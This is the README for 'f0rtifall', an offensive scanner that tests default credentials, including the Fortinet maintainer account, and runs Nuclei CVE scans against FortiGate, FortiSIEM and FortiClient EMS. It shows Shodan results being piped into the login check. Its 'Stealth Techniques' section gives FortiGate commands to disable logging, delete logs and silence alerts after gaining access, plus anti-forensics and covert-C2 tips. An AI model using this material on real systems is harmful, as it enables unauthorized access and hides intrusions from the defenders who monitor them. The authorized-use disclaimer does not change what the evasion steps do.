# f0rtifall

Fortinet security scanner: FortiGate, FortiSIEM, and FortiClient EMS. Checks default credentials and known vulnerabilities via Nuclei.

```
███████  ██████  ██████  ████████ ██ ███████  █████  ██      ██      
██      ██  ████ ██   ██    ██    ██ ██      ██   ██ ██      ██      
█████   ██ ██ ██ ██████     ██    ██ █████   ███████ ██      ██      
██      ████  ██ ██   ██    ██    ██ ██      ██   ██ ██      ██      
██       ██████  ██   ██    ██    ██ ██      ██   ██ ███████ ███████ 
```

**Author:** c0d3Ninja

### Tools in this folder

| Tool | Description |
|------|-------------|
| **forticheck.py** | FortiGate / FortiSIEM / FortiClient EMS scanner |
| **FORTINET-PENTESTING-GUIDE.md** | FortiGate pivoting, proxy, VIP, cleanup |

---

## Features

| Feature | Description |
|---------|-------------|
| **Default Login Check** | Tests 13 default/weak credential pairs against FortiGate web UI and REST API |
| **Session Verification** | Validates logins by hitting protected API endpoints to eliminate false positives |
| **FortiGate Fingerprinting** | Detects FortiGate panels via cookies, headers, SSL-VPN endpoints, and API |
| **FortiSIEM Fingerprinting** | Detects FortiSIEM panels via page content and headers (parallelized) |
| **FortiClient EMS Fingerprinting** | Detects FortiClient EMS via `/signin` page and version extraction |
| **Multi-Port Expansion** | Raw IPs on 443, 8443, 10443 (FortiGate); 443, 8443 (FortiSIEM/FortiClient) |

---

## Requirements

```bash
pip install -r requirements.txt
```

- Python 3.7+
- [Nuclei](https://github.com/projectdiscovery/nuclei) (required for `-m vuln`, `-m fortisiem`, `-m forticlient`)

---

## Usage

```
usage: forticheck.py [-h] [-u URL] [-f FILE] [--stdin]
                     [-m {login,vuln,all,fortisiem,forticlient}]
                     [-t THREADS] [-p PORTS] [-U USERLIST] [-P PASSLIST]
                     [--timeout TIMEOUT] [--delay DELAY] [-v] [--json]
                     [-o OUTPUT] [--no-defaults] [--no-maintainer]
                     [--nuclei-tags NUCLEI_TAGS] [--severity SEVERITY]
                     [--nuclei-concurrency NUCLEI_CONCURRENCY]
                     [--nuclei-path NUCLEI_PATH]
```

---

## Modes

| Mode | Flag | Description |
|------|------|-------------|
| **login** | `-m login` | Default credential check (FortiGate only) |
| **vuln** | `-m vuln` | Nuclei vulnerability scan only |
| **all** | `-m all` | Both login check and Nuclei scan (default) |
| **fortisiem** | `-m fortisiem` | FortiSIEM fingerprinting + Nuclei (fortisiem tag only) |
| **forticlient** | `-m forticlient` | FortiClient EMS fingerprinting + Nuclei (forticlient,fortinet tags) |

---

## Examples

### Default Login Check

```bash
# Single target
python3 forticheck.py -u 10.0.0.1 -m login

# With specific port
python3 forticheck.py -u 10.0.0.1 -p 8443 -m login

# File of targets
python3 forticheck.py -f targets.txt -m login -t 20

# Custom credentials
python3 forticheck.py -u 10.0.0.1 -m login -U users.txt -P passwords.txt

# Verbose (show failed attempts)
python3 forticheck.py -f targets.txt -m login -t 10 -v
```

### Nuclei Vulnerability Scan

```bash
# Scan targets for Fortinet CVEs
python3 forticheck.py -f targets.txt -m vuln

# Critical severity only
python3 forticheck.py -f targets.txt -m vuln --severity critical

# Custom tags
python3 forticheck.py -f targets.txt -m vuln --nuclei-tags fortigate,fortios

# Higher concurrency
python3 forticheck.py -f targets.txt -m vuln --nuclei-concurrency 100
```

### Full Scan (Login + Nuclei)

```bash
# Both modes
python3 forticheck.py -f targets.txt -m all -t 20

# JSON output
python3 forticheck.py -f targets.txt -m all --json -o results.json
```

### FortiSIEM Mode

```bash
# FortiSIEM fingerprinting + Nuclei vulnerability scan (fortisiem tag only)
python3 forticheck.py -f fortisiem_hosts.txt -m fortisiem

# With higher thread count for faster fingerprinting
python3 forticheck.py -f fortisiem_hosts.txt -m fortisiem -t 25

# Custom ports (default: 443, 8443)
python3 forticheck.py -u https://siem.example.com -m fortisiem -p 443
```

### FortiClient EMS Mode

```bash
# FortiClient EMS fingerprinting + Nuclei vulnerability scan (forticlient,fortinet tags)
python3 forticheck.py -f ems_hosts.txt -m forticlient

# Single target
python3 forticheck.py -u https://ems.example.com -m forticlient
```

### Piping from Other Tools

```bash
# From Shodan
shodan search 'ssl:"FortiGate"' --fields ip_str | python3 forticheck.py --stdin -m all

# From a file
cat ips.txt | python3 forticheck.py --stdin -m vuln -t 20

# Pipe to other tools
python3 forticheck.py -f targets.txt -m login --json -o results.json
```

---

## Options

| Option | Description |
|--------|-------------|
| `-u, --url` | Single target URL or IP |
| `-f, --file` | File with targets (one per line) |
| `--stdin` | Read targets from stdin |
| `-m, --mode` | Scan mode: `login`, `vuln`, `all`, `fortisiem`, `forticlient` (default: `all`) |
| `-t, --threads` | Thread count (default: 5) |
| `-p, --ports` | Ports for raw IPs (default: 443,8443,10443; fortisiem/forticlient: 443,8443) |
| `-U, --userlist` | Custom username wordlist |
| `-P, --passlist` | Custom password wordlist |
| `--timeout` | Request timeout in seconds (default: 10) |
| `--delay` | Delay between login attempts in seconds (default: 0) |
| `-v, --verbose` | Show failed login attempts |
| `--json` | Output results as JSON |
| `-o, --output` | Output file path |
| `--no-defaults` | Skip built-in default credential list |
| `--no-maintainer` | Skip maintainer account check |
| `--nuclei-tags` | Nuclei tags (default: fortisiem only for `-m fortisiem`; forticlient,fortinet for `-m forticlient`) |
| `--severity` | Nuclei severity filter (default: high,critical) |
| `--nuclei-concurrency` | Nuclei thread count (default: 50) |
| `--nuclei-path` | Path to nuclei binary (auto-detected if not set) |

---

## Target Input Formats

The targets file supports any mix of formats:

```
# Comments are skipped
10.0.0.1
10.0.0.2:8443
192.168.1.100
https://fortigate.company.com
https://10.0.0.5:10443
```

Raw IPs without a port are expanded by mode: FortiGate uses 443, 8443, 10443; FortiSIEM and FortiClient EMS use 443, 8443. Use `-p` to override.

---

## Default Credentials Tested

| Username | Password |
|----------|----------|
| admin | *(blank)* |
| admin | admin |
| admin | password |
| admin | fortinet |
| admin | fortigate |
| admin | 123456 |
| admin | admin123 |
| admin | changeme |
| admin | default |
| guest | *(blank)* |
| guest | guest |
| monitor | *(blank)* |
| monitor | monitor |

The maintainer account (`maintainer:bcpb<serial>`) is also tested when a serial number can be extracted from:

- HTML page source
- `X-Fortigate-Serial` response header
- `/api/v2/cmdb/system/status` API endpoint
- SSL certificate CN/SAN fields

---

## Nuclei Tags

| Tag | Coverage |
|-----|----------|
| `fortisiem` | FortiSIEM CVEs (CVE-2025-25256, CVE-2024-23108, etc.) |
| `fortinet` | General Fortinet templates |
| `fortigate` | FortiGate firewall CVEs and misconfigs |
| `fortios` | FortiOS operating system vulnerabilities |
| `fortiproxy` | FortiProxy web proxy |
| `forticlient` | FortiClient EMS |
| `fortimanager` | FortiManager central management |
| `fortiweb` | FortiWeb WAF |

---

## Output Files

| File | Content |
|------|---------|
| `forti-exposed.txt` | Successful login credentials |
| `forti-nuclei.txt` | Nuclei vulnerability findings |
| `forti_results.json` | Combined JSON output (with `--json`) |

---

## Stealth Techniques

Once you gain access to a FortiGate device, here are techniques to stay hidden.

### Disable Logging

```
# Disable all disk logging
config log disk setting
    set status disable
end

# Disable memory logging
config log memory setting
    set status disable
end

# Disable FortiAnalyzer/syslog forwarding
config log fortianalyzer setting
    set status disable
end

config log syslogd setting
    set status disable
end
```

### Selective Log Suppression (Stealthier)

Disabling all logging is a red flag. A subtler approach:

```
# Raise severity threshold so only critical events log
config log disk filter
    set severity critical
end

# Disable logging only on the firewall policy your traffic traverses
config firewall policy
    edit <policy_id>
        set logtraffic disable
        set logtraffic-start disable
    next
end
```

### Delete Existing Logs

```
execute log delete-all
execute log delete traffic
execute log delete event
execute log delete security
```

### Disable Alert Emails

```
config alertemail setting
    set username ""
    set mailto1 ""
    set filter-mode none
end
```

### Disable SNMP Traps

```
config system snmp sysinfo
    set status disable
end
```

### Operational Security Tips

| Technique | Description |
|-----------|-------------|
| **DNS over HTTPS** | Route DNS through DoH to prevent query logging by ISPs |
| **MAC Randomization** | `macchanger -r wlan0` before connecting to any network |
| **Live OS** | Boot from Tails/Whonix USB — leaves zero forensic traces on disk |
| **Proxy Chains** | Layer traffic through rotating SOCKS proxies with `proxychains` |
| **Covert C2** | DNS tunneling (`dnscat2`), ICMP tunneling (`ptunnel`), or C2 over legitimate APIs |
| **Timestomping** | `touch -t 202301151200 file` to match surrounding file timestamps |
| **Traffic Shaping** | Add random jitter between requests, scan during target business hours |
| **Browser Hardening** | Disable WebRTC, enable `resistFingerprinting`, use common screen resolutions |
| **Burn Infrastructure** | Fresh VPS per target, unique domains, destroy after use |
| **Metadata Stripping** | `exiftool -all= file` before uploading/sharing anything |
| **LOTL** | Use tools already on the target (`curl`, `openssl`, `python`) instead of uploading binaries |
| **Secure Deletion** | `shred -vfz -n 5 file` to overwrite before removal (less effective on SSDs — use LUKS) |

### Re-Enable Logging When Done

```
config log disk filter
    set severity information
    set traffic enable
    set event enable
end

config log disk setting
    set status enable
end
```

> **Note:** Modifying logging generates a config change event. If a SIEM or FortiAnalyzer is ingesting logs in real-time, the "logging disabled" event will be the last thing captured before logs go dark. Policy-level log disabling on specific rules is less detectable than globally killing logs.

---

## Disclaimer

This tool is intended for authorized security testing and research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before scanning any targets.

---

## License

MIT
